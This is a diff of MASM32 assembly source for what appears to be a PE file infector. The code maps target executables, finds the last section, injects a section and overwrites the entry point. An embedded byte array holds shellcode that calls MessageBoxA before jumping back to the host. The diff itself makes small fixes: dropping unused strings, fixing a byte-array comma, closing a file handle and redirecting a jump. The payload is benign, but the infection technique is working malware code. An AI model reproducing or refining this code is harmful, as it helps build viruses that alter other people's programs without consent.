@@ -9,14 +9,10 @@ includelib c:\masm32\lib\kernel32.lib
 includelib C:\masm32\lib\masm32.lib
 
 .data
-	pathTargetL		db		"Path target",0
 	listTargetL		db		"Targets list",0
 	nbSectionsL		db		"Nb sections",0
-	machineL		db		"Machine",0
 	infoFailedL		db		"Get info failed !!", 0
-	entryPointL		db		"EntryPoint",0
 	lastSectionL	db		"Last Section",0
-	jumpL			db		"Jump",0
 
 
 	mappedAddr		dd		0
@@ -87,7 +83,7 @@ includelib C:\masm32\lib\masm32.lib
 				byte 068h, 06Fh, 078h, 041h, 000h, 068h, 061h, 067h, 065h, 042h, 068h, 04Dh, 065h, 073h, 073h, 089h
 				byte 065h, 018h, 089h, 065h, 01Ch, 06Ah, 000h, 08Bh, 055h, 018h, 052h, 08Bh, 055h, 01Ch, 052h, 06Ah
 				byte 000h, 0FFh, 0D0h, 06Ah, 000h, 0E8h, 000h, 000h, 000h, 000h, 0FFh, 025h, 000h, 020h, 040h, 000h
-				byte 000h, 000h,
+				byte 000h, 000h
 
 .code
 
@@ -209,7 +205,7 @@ BLastSectionEnd:
 	ret
 GetLastSection endp
 
-OverwriteEntryPoint proc uses esi edi New:DWORD
+OverwriteEntryPoint proc USES ESI EDI New:DWORD
 	mov esi, imgOptHeader
 	lea edi, [esi].IMAGE_OPTIONAL_HEADER.AddressOfEntryPoint
 	mov esi, [edi]
@@ -361,13 +357,13 @@ MapExe proc path:DWORD
 	
 	invoke GetLastSection
 	test eax, eax
-	jz MapExeEnd
+	jz UnmapExe
 	
 	invoke InjectSection, eax
 
 UnmapExe:
 	invoke UnmapViewOfFile, mappedAddr
-	
+	invoke CloseHandle, hfile
 MapExeEnd:
 	ret
 MapExe endp
